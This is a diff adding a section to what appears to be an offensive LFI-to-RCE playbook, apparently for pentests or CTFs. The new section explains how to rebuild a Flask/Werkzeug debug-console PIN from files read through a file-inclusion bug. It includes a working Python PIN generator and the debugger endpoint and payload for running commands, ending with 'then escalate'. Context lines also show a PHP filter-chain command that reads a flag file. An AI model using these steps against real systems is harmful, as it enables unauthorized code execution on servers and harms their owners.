@@ -1,4 +1,4 @@
-# LFI → RCE (PHP Wrappers, Log Poisoning, Filter Chain)
+# LFI → RCE (PHP Wrappers, Log Poisoning, Filter Chain, Werkzeug PIN)
 
 ## When this applies
 
@@ -131,6 +131,38 @@ python3 /tmp/php_filter_chain_generator.py --chain '<?=`cat /opt/flag.txt`;die;?
 - CMS plugin loads modules via user-controlled header/parameter → set the path to the filter chain
 - Framework route maps a URL segment to a template include → inject filter chain in the URL
 - Application reads a config path from an HTTP header → set header to filter chain
+
+### Werkzeug debug console PIN RCE (Python/Flask)
+
+When a Flask app runs with `debug=True`, the Werkzeug interactive debugger exposes a Python console at `/console` (or on any traceback page). It's gated by a PIN — but the PIN is **deterministically derived** from host facts you can read via LFI/arbitrary file-read. Reconstruct it offline, unlock the console, and you have native RCE as the app user.
+
+The PIN seed is `username + modname + appname + modulepath + mac_address + machine_id`. Read each input through the file-read primitive:
+
+| Input | Where to read it |
+|-------|------------------|
+| `username` | `/proc/self/environ` (`USER=`) or `/etc/passwd` (owner of the app process) |
+| `mac_address` | `/sys/class/net/<iface>/address` → convert to decimal (`int(mac.replace(':',''),16)`) |
+| `machine_id` | `/etc/machine-id` **concatenated with** `/proc/self/cgroup` last path segment (Docker) — or `/proc/sys/kernel/random/boot_id` |
+| `modname` / `appname` | usually `flask.app` / `Flask` (defaults) |
+| `modulepath` | path to Werkzeug's `app.py`, e.g. `/usr/local/lib/python3.x/site-packages/flask/app.py` — read the traceback or `app.pyc` modpath |
+
+Critical gotcha: the **hash algorithm changed across Werkzeug versions** — older builds use `md5`, newer use `sha1`. Read the on-box `werkzeug/debug/__init__.py` to confirm which `hashlib` call `get_pin_and_cookie_name()` uses, and replicate its exact `probably_public_bits` / `private_bits` list ordering. A generator that hardcodes one algorithm silently produces a wrong PIN.
+
+```python
+# Mirror the target's werkzeug/debug/__init__.py exactly (algo + bit ordering).
+import hashlib
+from itertools import chain
+probably_public_bits = ['<USER>', 'flask.app', 'Flask', '/usr/local/lib/python3.x/site-packages/flask/app.py']
+private_bits = ['<MAC_AS_DECIMAL>', '<MACHINE_ID><CGROUP_ID>']
+h = hashlib.sha1()  # or md5() — match the on-box source
+for bit in chain(probably_public_bits, private_bits):
+    h.update(bit.encode('utf-8') if isinstance(bit, str) else bit)
+h.update(b'cookiesalt')
+num = ('%09d' % int(h.hexdigest(), 16))[:9]
+print('-'.join(num[i:i+3] for i in range(0, 9, 3)))  # → e.g. 174-628-611
+```
+
+Then POST to the debugger eval endpoint (`?__debugger__=yes&cmd=<py>&frm=0&s=<secret>`) with the computed PIN, or paste the PIN into the `/console` prompt. Run `__import__('os').popen('id').read()` to confirm RCE as the app user, then escalate.
 
 ### Post-exploitation enumeration
 
